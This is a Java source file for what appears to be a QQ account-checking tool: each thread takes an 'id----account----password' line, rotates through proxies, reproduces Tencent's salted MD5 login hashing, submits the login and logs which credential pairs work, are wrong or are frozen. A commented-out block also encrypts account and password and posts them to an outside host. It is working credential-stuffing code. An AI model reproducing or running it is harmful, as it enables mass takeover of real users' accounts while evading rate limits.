package ws.hoyland.sm;

//import java.io.ByteArrayOutputStream;
//import java.io.DataInputStream;
//import java.math.BigInteger;
//import java.security.KeyFactory;
//import java.security.PublicKey;
//import java.security.spec.RSAPublicKeySpec;
//import java.util.Observable;
//import java.util.Observer;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;

//import javax.crypto.Cipher;

import org.apache.http.HttpEntity;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
//import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.params.ConnRouteParams;
//import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreConnectionPNames;
import org.apache.http.util.EntityUtils;

//import ws.hoyland.security.ClientDetecter;
import ws.hoyland.util.Configuration;
import ws.hoyland.util.Util;
//import ws.hoyland.util.Crypter;
//import ws.hoyland.util.EngineMessage;
//import ws.hoyland.util.EngineMessageType;
//import ws.hoyland.util.HoylandClassLoader;
//import ws.hoyland.util.Util;

public class Task implements Runnable {//, Observer {
//	private int id = 0;
//	private String account = null;
//	private String password = null;
	private String line;

//	private ByteArrayOutputStream baos = null;

//	protected boolean run = false;
//	private boolean wflag = false;

	// private static Random RND = new Random();
	// private static String UAG =
	// "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 734; Maxthon; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)";
	// "Opera/9.25 (Windows NT 6.0; U; en)";
//	private static String UAG = "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; sdk Build/GRI34) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
//	private static Random RND = new Random();
//	private static String expBytes = "010001";
//	private static String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";

	private static Configuration CONFIGURATION = Configuration
			.getInstance("config.ini");
	private static String VERSION = "10074";
	
	static{
		HttpURLConnection connection = null;
		InputStream input = null;
		try{
			URL url = new URL("http://ui.ptlogin2.qq.com/ptui_ver.js?v="+Math.random());
			connection = (HttpURLConnection) url
					.openConnection();
			connection.setDoOutput(true);
			connection.setRequestMethod("GET");
			
			input = connection.getInputStream();
			byte[] bs = new byte[input.available()];
			input.read(bs);
			String resp = new String(bs);
			VERSION = resp.substring(resp.indexOf("ptuiV(\"")+7, resp.indexOf("\");"));
			System.err.println("version:"+VERSION);
		}catch(Exception e){
			e.printStackTrace();
		}finally{
			if(input!=null){
				try{
					input.close();
				}catch(Exception e){
					e.printStackTrace();
				}
			}
			if(connection!=null){
				try{
					connection.disconnect();
				}catch(Exception e){
					e.printStackTrace();
				}
			}
		}		
	}

	public Task(String line) {
		this.line = line;

//		this.run = true;
	}
	/**
	@Override
	public void update(Observable obj, Object arg) {

		final EngineMessage msg = (EngineMessage) arg;

		if (msg.getTid() == this.id || msg.getTid() == -1) { // -1, all tasks
																// message
			int type = msg.getType();
			switch (type) {
			case EngineMessageType.OM_SHUTDOWN:
				// System.out.println(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>2");
//				this.run = false;
//				if (request != null) {
//					request.abort();
//					request.releaseConnection();
//				}
				break;
			case EngineMessageType.OM_RELOAD_PROXIES:
//				wflag = !wflag;
			default:
				break;
			}
		}
	}
	 **/
	
	@Override
	public void run() {
		if (!Engine.getInstance().canRun()) {
			// if(!run){
			return;
		}

		int id = 0;
		String account = null;
		String password = null;
		
		String[] ls = line.split("----");
		try{
			id = Integer.parseInt(ls[0]);
			account = ls[1];
			password = ls[2];
		}catch(Exception e){
			System.err.println(line);
			e.printStackTrace();			
		}
		
		DefaultHttpClient client = null;
		HttpGet request = null;
//		private HttpPost post = null;
		HttpHost proxy = null;
		HttpResponse response = null;
		HttpEntity entity = null;
		String resp = null;
		
		// if(wflag){
		// synchronized(SyncUtil.RELOAD_PROXY_OBJECT){
		// try{
		// SyncUtil.RELOAD_PROXY_OBJECT.wait();//等待更新完代理
		// }catch(Exception e){
		// //
		// }
		// }
		// }
		//
		// synchronized(SyncUtil.START_OBJECT){
		// //通知有新线程开始执行
//		Engine.getInstance().beginTask();
		// }

		try {
			client = new DefaultHttpClient();
			client.getParams().setParameter(
					CoreConnectionPNames.CONNECTION_TIMEOUT,
					1000 * Integer.parseInt(CONFIGURATION
							.getProperty("TIMEOUT")));
			client.getParams().setParameter(
					CoreConnectionPNames.SO_TIMEOUT,
					1000 * Integer.parseInt(CONFIGURATION
							.getProperty("TIMEOUT")));
			
			//client.getConnectionManager().closeIdleConnections(4000, TimeUnit.MILLISECONDS);
			
			/**
			byte[] bs = null;
//			HttpURLConnection connection = null;
//			OutputStream os = null;
//			InputStream input = null;
			DataInputStream in = null;
			boolean getit = false;
			try {
				//URL url = new URL("http://www.y3y4qq.com/gc");

				Crypter crypt = new Crypter();
				byte[] mid = Converts.hexStringToByte(ClientDetecter
						.getMachineID("SMZS"));

				// String url = "http://www.y3y4qq.com/ge";
				byte[] key = Util.genKey();
				String header = Converts.bytesToHexString(key).toUpperCase()
						+ Converts.bytesToHexString(crypt.encrypt(mid, key))
								.toUpperCase();
				// Console.WriteLine(byteArrayToHexString(key).ToUpper());
				// Console.WriteLine(content);
				// client.UploadString(url, content);
				// client.UploadString(url,
				// client.Encoding = Encoding.UTF8;

				String content = "account=" + account + "&password=" + password;
				// RSA加密
				KeyFactory factory = KeyFactory.getInstance("RSA");
				Cipher cipher = Cipher.getInstance("RSA");
				BigInteger modules = new BigInteger(modBytes, 16);
				BigInteger exponent = new BigInteger(expBytes, 16);

				RSAPublicKeySpec pubSpec = new RSAPublicKeySpec(modules,
						exponent);
				PublicKey pubKey = factory.generatePublic(pubSpec);
				cipher.init(Cipher.ENCRYPT_MODE, pubKey);
				byte[] encrypted = cipher.doFinal(content.getBytes());

				post = new HttpPost("http://www.y3y4qq.com/gc");
				
				post.setHeader("User-Agent", UAG);
				post.setHeader("Content-Type",
						"application/x-www-form-urlencoded");
				post.setHeader("Connection",
						"close");

				StringBuffer sb = new StringBuffer();
				sb.append(header);
				sb.append(Converts.bytesToHexString(encrypted));
				
				post.setEntity(new StringEntity(sb.toString()));

				response = client.execute(post);
				entity = response.getEntity();
				
				
				in = new DataInputStream(entity.getContent());
				baos = new ByteArrayOutputStream();
				byte[] barray = new byte[32];
				int size = -1;
				while ((size = in.read(barray)) != -1) {
					baos.write(barray, 0, size);
				}
				bs = baos.toByteArray();
//				ByteArrayInputStream bais = new ByteArrayInputStream(
//						baos.toByteArray());

				
//				connection = (HttpURLConnection) url
//						.openConnection();
//				connection.setDoOutput(true);// 允许连接提交信息
//				connection.setRequestMethod("POST");// 网页提交方式“GET”、“POST”
//				// connection.setRequestProperty("User-Agent",
//				// "Mozilla/4.7 [en] (Win98; I)");
//				connection.setRequestProperty("Content-Type",
//						"text/plain; charset=UTF-8");
//				connection.setRequestProperty("Connection",
//						"close");
//				StringBuffer sb = new StringBuffer();
//				sb.append(header);
//				sb.append(Converts.bytesToHexString(encrypted));
//				os = connection.getOutputStream();
//				os.write(sb.toString().getBytes());
//				os.flush();
				//os.close();

//				input = connection.getInputStream();
//				bs = new byte[input.available()];
//				input.read(bs);
				getit = true;
			} catch (Exception e) {
				e.printStackTrace();
				getit = false;
			}finally{
				if(in!=null){
					in.close();
				}
				if(baos!=null){
					baos.close();
				}
				try {
					if (entity != null) {
						EntityUtils.consume(entity);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if(post!=null){
					post.releaseConnection();
					post.abort();
				}				
			}
			**/
			boolean getit = true;
			String loginSig = null;
			if(getit){
				
				request = new HttpGet("http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");

//				request.setHeader("User-Agent", UAG);
//				request.setHeader("Content-Type", "text/html");
//				request.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
//				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
//				request.setHeader("Accept-Encoding", "gzip, deflate");
//				request.setHeader("Referer", "http://id.qq.com/login/ptlogin.html");
//				request.setHeader("Connection", "keep-alive");				

				response = client.execute(request);
				entity = response.getEntity();

				resp = EntityUtils.toString(entity);
				
				try {
					if (entity != null) {
						EntityUtils.consume(entity);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (request != null) {
					request.releaseConnection();
					request.abort();
				}

				//",clienti
				loginSig = resp.substring(resp.indexOf(",login_sig:\"")+12, resp.indexOf("\",clientip"));
				System.err.println(loginSig);
				
				
				String px = Engine.getInstance().getProxy();
				// if(px==null){
				// throw new NoProxyException("No Proxy!");
				// }
				if (!Engine.getInstance().canRun()) {
					return;
				}
				
				String[] ms = px.split(":");
				proxy = new HttpHost(ms[0], Integer.parseInt(ms[1]));

				
				client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
						proxy);
				
				request = new HttpGet("http://check.ptlogin2.qq.com/check?regmaster=&uin="+account+"&appid=1006102&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&u1=http%3A%2F%2Fid.qq.com%2Findex.html&r="+Math.random());

//				request.setHeader("User-Agent", UAG);
//				//request.setHeader("Content-Type", "text/html");
//				request.setHeader("Accept", "*/*");
//				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
//				request.setHeader("Accept-Encoding", "gzip, deflate");
//				request.setHeader("Referer", "http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
//				request.setHeader("Connection", "keep-alive");				

				
				Engine.getInstance().info(
						account + " -> " + proxy.getHostName() + ":"
								+ proxy.getPort());
				
				response = client.execute(request);
				entity = response.getEntity();
				resp = EntityUtils.toString(entity);
				
				try {
					if (entity != null) {
						EntityUtils.consume(entity);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (request != null) {
					request.releaseConnection();
					request.abort();
				}
				
				boolean nvc = false;
				//nvc = (resp.charAt(14)=='1')?true:false;
				//System.out.println("A:"+resp);
				if(!resp.startsWith("ptui_checkVC")){
					throw new Exception("Invalid Proxy server");
				}

				nvc = (resp.charAt(14)=='1')?true:false;
				
				//没有做RSAKEY检查，默认是应该有KEY，用getEncryption；否则用getRSAEncryption
				//System.out.println("B:"+resp);
				if(nvc){//验证码
					System.out.println(">>>>>>>>>>>>>>>>");
					return;
				}
				System.out.println("nvc:"+resp.charAt(14));
				System.out.println("============");
				//System.out.println(resp);
				int fidx = resp.indexOf(",");
				int lidx = resp.lastIndexOf(",");
				
				String vcode = resp.substring(fidx+2, lidx-1);
				System.err.println("vcode="+vcode);
				String salt = resp.substring(lidx+2, lidx+34);
				System.err.println("salt="+salt);
				

				//计算ECP
				MessageDigest md = MessageDigest.getInstance("MD5"); 
				byte[] results = md.digest(password.getBytes());
				
				int psz = results.length;
				byte[] rs = new byte[psz+8];
				for(int i=0;i<psz;i++){
					rs[i] = results[i];
				}
				
				String[] salts = salt.substring(2).split("\\\\x");
				//System.out.println(salts.length);
				for(int i=0; i<salts.length; i++){
					rs[psz+i] = (byte)Integer.parseInt(salts[i], 16);
				}
				
				results = md.digest(rs); 
				String resultString = Util.byteArrayToHexString(results).toUpperCase();
				
				//vcode = "!RQM";
				results = md.digest((resultString+vcode.toUpperCase()).getBytes()); 				
				resultString = Util.byteArrayToHexString(results).toUpperCase();
				//System.out.println(resultString);
				String ecp = resultString;
				
				
				//System.out.println("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
				request = new HttpGet("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");

//				request.setHeader("User-Agent", UAG);
//				//request.setHeader("Content-Type", "text/html");
//				request.setHeader("Accept", "*/*");
//				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
//				request.setHeader("Accept-Encoding", "gzip, deflate");
//				request.setHeader("Referer", "http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
//				request.setHeader("Connection", "keep-alive");				
				request.setHeader("Cookie", "ptui_loginuin="+account);
				
				// try{
				// Thread.sleep(200);
				// }catch(Exception e){
				// return;
				// }
	
				// if(!run){
//				if (!Engine.getInstance().canRun()) {
//					return;
//				}
				
				response = client.execute(request);
				entity = response.getEntity();
				resp = EntityUtils.toString(entity);
	
				//if(resp.startsWith("ptuiCB('4'")){ //验证码错误
				if(resp.startsWith("ptuiCB('0'")){ //成功登录
					Engine.getInstance().log(0, id, account + "----" + password);
				}else if(resp.startsWith("ptuiCB('3'")){ //您输入的帐号或密码不正确，请重新输入
					Engine.getInstance().log(1, id,  account + "----" + password);
				}else if(resp.startsWith("ptuiCB('19'")){ //帐号冻结，提示暂时无法登录
					Engine.getInstance().log(2, id,  account + "----" + password);
				}else{
					// ptuiCB('19' 暂停使用
					// ptuiCB('7' 网络连接异常
					Engine.getInstance().addTask(line);
				}
				
				/**
				 * Class<?> clazz = null; clazz = new
				 * HoylandClassLoader().loadClass("ws.hoyland.sm.Dynamicer",
				 * account, password); resp = (String)(clazz.getMethod("excute", new
				 * Class[] { DefaultHttpClient.class}).invoke(null, new
				 * Object[]{client}));
				 **/
	
//				if (resp.indexOf("pt.handleLoginResult") == -1)// 代理异常
//				{
//					Engine.getInstance().addTask(line);
//					// System.out.println("A2");
//					// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
//				} else {
//					// System.out.println("A3");
//					// bool ok = false;
//					if (resp.indexOf("," + account + ",0,") != -1) {
//						Engine.getInstance().log(0, id, account + "----" + password);// account
//																					// +
//																					// " / "
//																					// +
//																					// proxy
//						// task.Abort();
//					} else if (resp.indexOf(",0,40010,") != -1) {
//						Engine.getInstance().log(1, id,  account + "----" + password);
//						// task.Abort();
//					} else if (resp.indexOf(",0,40026,") != -1) {
//						Engine.getInstance().log(2, id, account + "----" + password);
//						// task.Abort();
//					} else if (resp.indexOf("," + account + ",40001,") != -1)// 验证码
//					{
//						//System.err.println("adding "+line);
//						Engine.getInstance().addTask(line);
//	
//						// 不离开当前任务
//						// Thread.Sleep(1000 *
//						// Int32.Parse(cfa.AppSettings.Settings["P_ITV"].Value));//N秒后继续
//					} else // 代理异常
//					{
//						Engine.getInstance().addTask(line);
//						// System.out.println("A4");
//						// System.out.println("proxy="+proxy);
//						// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
//					}
//				}
			}
		}
		// catch(NoProxyException e){
		// //
		// }
		catch (Exception e) {
			//e.printStackTrace();
			Engine.getInstance().addTask(line);
			System.err.println(e.getMessage());
			// try{

			// if(proxy!=null){
			// Engine.getInstance().removeProxy(proxy.getHostName()+":"+proxy.getPort());
			// }

			// }catch(Exception ex){
			// e.printStackTrace();
			// System.err.println("////////////");
			// ex.printStackTrace();
			// }
		} finally {
			try {
				if (entity != null) {
					EntityUtils.consume(entity);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			if (request != null) {
				request.releaseConnection();
				request.abort();
			}

			if(client!=null){
				client.getConnectionManager().shutdown();
			}
		}

//		String[] dt = new String[2];
//		dt[0] = "0";

		//Engine.getInstance().deleteObserver(this);

		// synchronized(SyncUtil.FINISH_OBJECT){
//		Engine.getInstance().endTask();
		// }
	}
}
